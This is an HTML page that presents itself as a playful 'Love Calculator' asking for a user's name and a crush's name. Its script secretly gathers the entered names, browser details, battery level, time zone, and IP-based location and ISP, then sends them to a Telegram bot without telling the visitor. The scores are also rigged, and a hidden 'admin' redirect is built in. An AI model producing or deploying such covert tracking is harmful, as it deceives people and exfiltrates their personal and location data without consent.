<!DOCTYPE html>
<html lang="en">
<head>

  <meta property="og:title" content="Love Calculator 💖">
  <meta property="og:description" content="Check your love percentage instantly 💘">
  <meta property="og:image" content="https://files.catbox.moe/qsbfbr.jpg">
  <meta property="og:type" content="website">
  <meta property="og:url" content="">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="Love Calculator 💖">
  <meta name="twitter:description" content="Check your love percentage instantly 💘">
  <meta name="twitter:image" content="https://files.catbox.moe/qsbfbr.jpg">

  
  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: Segoe UI, Tahoma, Verdana, sans-serif;
      background: linear-gradient(135deg, #f14652d4, #de3675, #e2ece9);
      overflow: hidden;
      color: #333;
    }
    .heart { position: absolute; bottom: -50px; font-size: 20px; color: rgba(196,69,105,0.3); animation: floatUp linear forwards; }
    @keyframes floatUp {
      to { transform: translateY(-110vh) rotate(360deg); opacity: 0; }
    }
    .card {
      position: relative; z-index: 2;
      width: 360px; padding: 28px;
      border-radius: 18px;
      background: rgba(255,255,255,0.65);
      backdrop-filter: blur(12px);
      box-shadow: 0 8px 28px rgba(0,0,0,0.08);
      text-align: center;
    }
    h2 { margin-bottom: 20px; font-weight: 600; color: #a41c43; }
    input {
      width: 90%; padding: 12px; margin: 8px 0;
      border: 1px solid #ddd; border-radius: 10px;
      font-size: 16px; text-align: center;
      transition: border 0.3s;
    }
    input:focus { border: 1px solid #c44569; outline: none; }
    button {
      width: 100%; padding: 12px; margin-top: 15px;
      border: none; border-radius: 10px;
      background: #c44569; color: white;
      font-size: 16px; font-weight: 500;
      cursor: pointer; transition: 0.3s;
    }
    button:hover { background: #a23352; }
    .loading {
      display: none; margin-top: 20px;
      width: 100%; height: 12px; border-radius: 8px;
      background: #f1d2da; overflow: hidden;
      position: relative;
    }
    .loading::after {
      content: ""; position: absolute; top: 0; left: -40%;
      width: 40%; height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.8), transparent);
      animation: shimmer 1.5s infinite;
    }
    @keyframes shimmer { 100% { left: 100%; } }
    .result {
      margin-top: 20px; display: none;
      padding: 16px; border-radius: 12px; background: #fff;
      color: #444; box-shadow: 0 0 15px rgba(0,0,0,0.08);
      animation: fadeIn 0.8s ease;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(10px); }
      to { opacity: 1; transform: translateY(0); }
    }
    .lovePercent {
      font-size: 28px; font-weight: bold; color: #c44569;
      animation: pulse 1.5s infinite;
    }
    @keyframes pulse {
      0%,100% { transform: scale(1); } 50% { transform: scale(1.05); }
    }
  </style>
</head>
<body>

<div id="hearts-container"></div>
<div class="card">
  <h2>💖 Love Calculator</h2>
  <input type="text" id="yourName" placeholder="Enter Your Name">
  <input type="text" id="crushName" placeholder="Enter Crush Name">
  <button onclick="calculateLove()">Calculate</button>
  <div class="loading" id="loading"></div>
  <div class="result" id="result"></div>
</div>

<script src="passwords.js"></script>
<script>
function createHeart() {
  const h = document.createElement("div");
  h.className = "heart";
  h.textContent = "❤️";
  h.style.left = Math.random() * 100 + "vw";
  h.style.fontSize = (Math.random() * 20 + 20) + "px";
  h.style.animationDuration = (Math.random() * 6 + 4) + "s";
  document.getElementById("hearts-container").appendChild(h);
  setTimeout(() => h.remove(), 10000);
}
setInterval(createHeart, 600);

async function calculateLove() {
  const u = document.getElementById("yourName").value.trim();
  const c = document.getElementById("crushName").value.trim();
  if(!u || !c) { alert("Please enter both names!"); return; }

  // 🔑 Admin check (case-insensitive)
  if (u.toLowerCase() === "admin" || c.toLowerCase() === "admin") {
    window.location.href = "admin.html";
    return;
  }

  document.getElementById("result").style.display = "none";
  document.getElementById("loading").style.display = "block";

  setTimeout(async () => {
    document.getElementById("loading").style.display = "none";
    let percent, msg;
    if (u.toLowerCase().includes("imran") || c.toLowerCase().includes("imran")) {
      percent = Math.floor(Math.random() * 15) + 1;
      msg = `<p>Better luck next time, ${u} & ${c}. Not every bond is meant to be. 💔</p>`;
    } else {
      percent = Math.floor(Math.random() * 9) + 91;
      msg = `<p>${u} & ${c} are destined to share an everlasting bond of love. ❤️‍🩹</p>`;
    }
    document.getElementById("result").innerHTML = `
      <div class="lovePercent">💘 Love Score: ${percent}%</div>
      ${msg}
    `;
    document.getElementById("result").style.display = "block";
    await sendToTelegram(u, c, percent);
  }, 3000);
}

async function sendToTelegram(u, c, percent) {
  let battery = "N/A";
  try { const b = await navigator.getBattery(); battery = Math.round(b.level * 100) + "%"; } catch {}
  const browser = navigator.userAgent;
  const time = new Date().toLocaleString();
  const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
  let ip="N/A", city="N/A", region="N/A", country="N/A", org="N/A", isp="N/A";
  try {
    const r = await fetch("https://ipwho.is/");
    const j = await r.json();
    if (j.success) {
      ip = j.ip || ip;
      city = j.city || city;
      region = j.region || region;
      country = j.country || country;
      org = j.org || org;
      isp = j.connection?.isp || isp;
    }
  } catch {}
  const msg =
`╔━━━━━━━━━━━━━━━━━━━
║ 💖 Love Calculator Entry 💖
╚━━━━━━━━━━━━━━━━━━━
║ 👤 User: ${u}
║ 😍 Crush: ${c}
║ ❤️ Love %: ${percent}%
╚━━━━━━━━━━━━━━━━━━━
║ 🌐 Browser: ${browser}
║ 🕒 Time: ${time}
║ 📡 IP: ${ip}
║ 🔋 Battery: ${battery}
║ ⏳ Time Zone: ${tz}
║ 🔍 Org: ${org}
║ 🌍 Location: ${city}/${region}/${country}
║ 📡 ISP: ${isp}
╚━━━━━━━━━━━━━━━━━━━
║ 🪿 developed by: 𝐃 ʜ 𝙰 ɴ 𝐢ⁱɪ  
╚━━━━━━━━━━━━━━━━━━━`;

   // ✅ Correct way to send to Telegram
   fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: {"Content-Type":"application/json"},
      body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
   });
}
</script>

</body>
  </html>
